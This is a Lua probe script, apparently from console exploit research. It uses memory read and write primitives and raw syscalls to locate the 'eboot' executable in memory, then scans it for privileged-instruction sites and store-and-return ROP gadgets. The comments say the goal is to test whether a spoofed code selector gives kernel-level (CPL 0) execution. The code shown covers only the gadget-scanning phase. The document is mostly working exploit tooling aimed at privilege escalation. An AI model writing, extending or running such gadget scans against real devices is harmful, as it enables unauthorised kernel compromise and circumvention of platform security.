-- CRASH_CLASS: HIGH
-- PROBE 724b: find a privileged-instruction gadget ending in ret.
--
-- Context: 189a recorded CS=0x40 producing a live thread with no panic, and the
-- repository concluded the firmware replaces the selector. That conclusion was
-- never tested with a privileged instruction. If CS=0x40 is honoured the child
-- runs at CPL 0 and `mov rax, cr0` succeeds; at CPL 3 it raises #GP and the
-- kernel kills the process, which is exactly what the control below does.
--
-- Phase [A] scans eboot for `0F 20`/`0F 22` (mov to/from control register) and
-- prints file offsets, so phase [B] can reuse them after a relaunch (offsets are
-- stable across launches; only the base moves).
-- Phase [B] runs the CPL 3 control last, because it is expected to kill the
-- process: a child with CS=0x43 pointed at the same gadget.

print("=== PROBE 724b: privileged gadget scan ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
print(string.format("[0] eboot=0x%08X_%08X", math.floor(ebase/4294967296), ebase % 4294967296))
local EB = 0x494000

local function scan_all(pat)
    local res, chunk, off = {}, 0x1000, 0
    while off < EB do
        local n = math.min(chunk, EB-off)
        local ok, s = pcall(function() return memory.read_buffer(ebase+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local p = 1
        while true do
            local q = string.find(s, pat, p, true)
            if not q then break end
            res[#res+1] = off + q - 1
            p = q + 1
        end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return res
end

print("[A] scanning privileged instruction sites and their follower bytes")
local function dump(name, pat, max)
    local l = scan_all(pat)
    local out = {}
    for i=1,math.min(#l,max) do
        local o = l[i]
        local ok, s = pcall(function() return memory.read_buffer(ebase+o, 10) end)
        if ok and type(s)=="string" and #s>=10 then
            local hex = {}
            for k=#pat+1,10 do hex[#hex+1] = string.format("%02X", string.byte(s,k)) end
            out[#out+1] = string.format("%X[%s]", o, table.concat(hex," "))
        end
    end
    print(string.format("[A] %s sites=%d", name, #l))
    for i=1,#out do print("      " .. out[i]) end
end
dump("rdmsr 0F32",  string.char(0x0F,0x32), 8)
dump("rdpmc 0F33",  string.char(0x0F,0x33), 5)
dump("invlpg 0F01", string.char(0x0F,0x01), 8)
dump("rdtsc 0F31",  string.char(0x0F,0x31), 5)
local s2 = scan_all(string.char(0x48,0x89,0x16,0xC3))
print(string.format("[A] mov [rsi],rdx;ret sites=%d", #s2))
if #s2>0 then print(string.format("[A] storeRDX=%X", s2[1])) end
local s3 = scan_all(string.char(0x0F,0x32,0xC3))
print(string.format("[A] rdmsr;ret sites=%d", #s3))
if #s3>0 then print(string.format("[A] rdmsrRet=%X", s3[1])) end
local s4 = scan_all(string.char(0x0F,0x31,0xC3))
print(string.format("[A] rdtsc;ret sites=%d", #s4))
if #s4>0 then print(string.format("[A] rdtscRet=%X", s4[1])) end
local st = scan_all(string.char(0x48,0x89,0x06,0xC3))
if #st>0 then print(string.format("[A] storeRAX=%X", st[1])) end
print("[A] done, alive=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
